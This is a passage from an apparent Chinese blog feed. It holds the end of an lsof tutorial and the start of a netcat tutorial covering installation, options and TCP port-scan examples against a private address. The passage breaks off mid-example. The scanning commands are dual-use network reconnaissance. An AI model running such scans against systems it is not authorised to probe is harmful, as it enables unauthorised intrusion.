&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -p &lt;span class="m">1234&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-c &amp;lt;进程名&amp;gt;&lt;/code>：按进程名过滤。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -c sshd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-c &amp;lt;进程名1&amp;gt; -c &amp;lt;进程名2&amp;gt;&lt;/code>：同时列出多个进程的打开文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -c mysql -c apache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="二按用户过滤">（二）按用户过滤
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;code>-u &amp;lt;用户名&amp;gt;&lt;/code>：按用户名过滤。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -u username
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-u ^&amp;lt;用户名&amp;gt;&lt;/code>：排除指定用户的打开文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -u ^root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="三按文件名或目录过滤">（三）按文件名或目录过滤
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>指定文件名或目录名，列出与之相关的打开文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof /path/to/file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lsof /path/to/directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>使用 &lt;code>+D&lt;/code> 递归列出目录及其子目录下所有打开的文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof +D /path/to/directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="四按网络连接过滤">（四）按网络连接过滤
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;code>-i&lt;/code>：显示所有网络连接。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-i :&amp;lt;端口号&amp;gt;&lt;/code>：按端口号过滤。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i :80
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-i &amp;lt;协议&amp;gt;@&amp;lt;IP地址&amp;gt;&lt;/code>：按协议和 IP 地址过滤。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i tcp@192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-i TCP&lt;/code>：仅显示 TCP 连接。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i TCP
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-i UDP&lt;/code>：仅显示 UDP 连接。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i UDP
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="五其他选项">（五）其他选项
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;code>-n&lt;/code>：不解析主机名，直接显示 IP 地址。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>-P&lt;/code>：不解析端口号，直接显示数字。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>-t&lt;/code>：仅显示进程 ID。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>-l&lt;/code>：显示文件的 inode 号。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>-a&lt;/code>：组合多个条件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -u username -c process_name
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="五使用场景">五、使用场景
&lt;/h2>&lt;h3 id="一查找占用特定文件的进程">（一）查找占用特定文件的进程
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof /var/log/syslog
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可帮助你找出哪个进程正在使用 &lt;code>/var/log/syslog&lt;/code> 文件。&lt;/p>
&lt;h3 id="二查找占用特定端口的进程">（二）查找占用特定端口的进程
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i :80
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可帮助你找出哪个进程正在使用 TCP 端口 80。&lt;/p>
&lt;h3 id="三查找某个用户打开的文件">（三）查找某个用户打开的文件
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -u username
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可列出用户 &lt;code>username&lt;/code> 打开的所有文件。&lt;/p>
&lt;h3 id="四查看某个进程打开的文件">（四）查看某个进程打开的文件
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -p &lt;span class="m">1234&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可列出进程 ID 为 1234 的所有打开文件。&lt;/p>
&lt;h3 id="五查找被删除但仍在使用的文件">（五）查找被删除但仍在使用的文件
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof &lt;span class="p">|&lt;/span> grep deleted
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可帮助你找出已被删除但仍被进程占用的文件。&lt;/p>
&lt;h3 id="六监控文件系统活动">（六）监控文件系统活动
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof +D /path/to/directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可实时监控指定目录及其子目录下所有打开的文件。&lt;/p>
&lt;h3 id="七查找打开的文件数量">（七）查找打开的文件数量
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof &lt;span class="p">|&lt;/span> wc -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可统计系统中打开的文件总数。&lt;/p>
&lt;h3 id="八识别资源泄漏">（八）识别资源泄漏
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -p &amp;lt;PID&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可帮助你查找某个进程打开的文件，从而排查资源泄漏问题。&lt;/p>
&lt;h3 id="九查看特定类型的文件">（九）查看特定类型的文件
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -U
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可列出所有 Unix 域套接字。&lt;/p>
&lt;h2 id="六高级用法">六、高级用法
&lt;/h2>&lt;h3 id="一列出监听的网络连接">（一）列出监听的网络连接
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i TCP:LISTEN
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可列出所有处于监听状态的 TCP 端口。&lt;/p>
&lt;h3 id="二列出特定用户的网络连接">（二）列出特定用户的网络连接
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -a -u username -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可列出用户 &lt;code>username&lt;/code> 的所有网络连接。&lt;/p>
&lt;h3 id="三列出特定协议的文件">（三）列出特定协议的文件
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -i TCP:https
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可列出所有使用 HTTPS 端口的 TCP 文件。&lt;/p>
&lt;h3 id="四重复模式">（四）重复模式
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -r &lt;span class="m">5&lt;/span> -i UDP
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令每 5 秒输出一次所有正在进行的 UDP 连接，直到手动终止。&lt;/p>
&lt;h3 id="五列出特定范围的文件描述符">（五）列出特定范围的文件描述符
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lsof -d 2-3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此命令可列出文件描述符范围为 2-3 的文件。&lt;/p>
&lt;h2 id="七注意事项">七、注意事项
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>权限问题&lt;/strong>：某些信息（如其他用户的文件）可能需要管理员权限才能查看。&lt;/li>
&lt;li>&lt;strong>输出格式&lt;/strong>：&lt;code>lsof&lt;/code> 的输出包含多个字段，如进程 ID、用户、文件描述符等。可以通过 &lt;code>man lsof&lt;/code> 查看详细字段说明。&lt;/li>
&lt;li>&lt;strong>性能影响&lt;/strong>：在系统文件数量较多时，&lt;code>lsof&lt;/code> 的运行可能会稍显缓慢，尤其是在没有过滤条件的情况下。&lt;/li>
&lt;/ol>
&lt;h2 id="八总结">八、总结
&lt;/h2>&lt;p>&lt;code>lsof&lt;/code> 是一个功能强大的工具，适用于多种场景，包括故障排查、性能监测、资源管理等。通过掌握基本语法和常用选项，可以快速定位文件占用、网络连接等问题。结合过滤条件和其他命令，&lt;code>lsof&lt;/code> 的应用场景更加广泛，能够满足复杂的系统管理和调试需求。&lt;/p></description></item><item><title>Nc（netcat）命令使用</title><link>https://souljian.cn/p/745203036/</link><pubDate>Mon, 21 Apr 2025 10:37:16 +0800</pubDate><guid>https://souljian.cn/p/745203036/</guid><description>&lt;h2 id="一简介">一、简介
&lt;/h2>&lt;p>&lt;code>nc&lt;/code>（Netcat）是一个功能强大的网络工具，用于读写网络连接（TCP 和 UDP）。它常被称为&amp;quot;网络瑞士军刀&amp;quot;，可用于端口扫描、数据传输、远程控制等多种用途。&lt;/p>
&lt;h2 id="二安装">二、安装
&lt;/h2>&lt;h3 id="一通过包管理器安装">（一）通过包管理器安装
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>Debian/Ubuntu&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install netcat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>CentOS/RHEL&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo yum install nc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>Arch Linux&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo pacman -S inetutils
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>Fedora&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo dnf install nc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>openSUSE&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo zypper install netcat-openbsd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="二从源代码编译安装">（二）从源代码编译安装
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>从官方网站下载 &lt;code>nc&lt;/code> 的源代码。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>解压源代码包并进入解压后的目录。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>执行以下命令来编译和安装 &lt;code>nc&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./configure
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo make install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="三验证安装">（三）验证安装
&lt;/h3>&lt;p>安装完成后，可以通过运行以下命令来验证 &lt;code>nc&lt;/code> 是否安装成功：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -h
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如果返回 &lt;code>nc&lt;/code> 命令的帮助信息，则表示安装成功。&lt;/p>
&lt;h2 id="三基本语法">三、基本语法
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc &lt;span class="o">[&lt;/span>选项&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>主机&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>端口&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="四常用选项">四、常用选项
&lt;/h2>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>选项&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>-l&lt;/code>&lt;/td>
&lt;td>使用监听模式，管控传入的资料&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-p&lt;/code>&lt;/td>
&lt;td>设置本地主机使用的通信端口&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-s&lt;/code>&lt;/td>
&lt;td>设置本地主机送出数据包的 IP 地址&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-u&lt;/code>&lt;/td>
&lt;td>使用 UDP 传输协议&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-v&lt;/code>&lt;/td>
&lt;td>显示指令执行过程&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-w&lt;/code>&lt;/td>
&lt;td>设置等待连线的时间&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>-z&lt;/code>&lt;/td>
&lt;td>使用 0 输入/输出模式，只在扫描通信端口时使用&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="五使用示例">五、使用示例
&lt;/h2>&lt;h3 id="一端口扫描">（一）端口扫描
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>TCP 端口扫描&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -zv 192.168.1.1 80-443
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>扫描目标 IP 地址（192.168.1.1）上的端口 80 到 443，检查是否开放。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>UDP 端口扫描&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
